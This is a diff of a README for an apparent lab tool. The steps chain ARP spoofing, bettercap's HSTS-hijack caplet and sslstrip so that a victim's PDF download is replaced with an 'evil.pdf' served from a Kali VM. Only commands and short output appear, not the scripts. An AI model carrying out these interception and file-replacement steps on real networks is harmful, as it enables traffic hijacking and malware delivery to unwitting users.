@@ -30,26 +30,26 @@ Example:
 
 ## Kicking the tyres
 
-* Choose what type of file to replace, and make sure you have a replacement file in /var/www/html/evil/
+* Choose what type of file to replace, and make sure you have a replacement file in `/var/www/html/evil/`
 * Run the [arp_spoofer.py script](/arp_spoofer)
 
 ```shell
-@kali:~$ sudo python3 arp_spoofer.py
-[sudo] password for <user>: 
-[+] Setting forward
-[+] Packets sent: 63
+    @kali:~$ sudo python3 arp_spoofer.py
+    [sudo] password for <user>: 
+    [+] Setting forward
+    [+] Packets sent: 63
 ```
 * Run `bettercap` (also see the Troubleshooting section below)
 
 ```shell
-@kali:~$ sudo bettercap -iface eth0 -caplet hstshijack/hstshijack
+  @kali:~$ sudo bettercap -iface eth0 -caplet hstshijack/hstshijack
 ```
 * Run the `file_interceptor.py` script. Defaults are set to replace a .pdf with an evil.pdf file in the `/var/www/html/evil/` location of the Kali `apache2` server on the Kali VM, and using `sslstrip`.
 
 ```shell
-@kali:~$ sudo python3 file_interceptor.py 
+  @kali:~$ sudo python3 file_interceptor.py 
 ```
-And test file is replaced on Windows machine.
+And test file is replaced on Windows machine. Clear cache and history of browser first!
 
 ## Troubleshooting
 
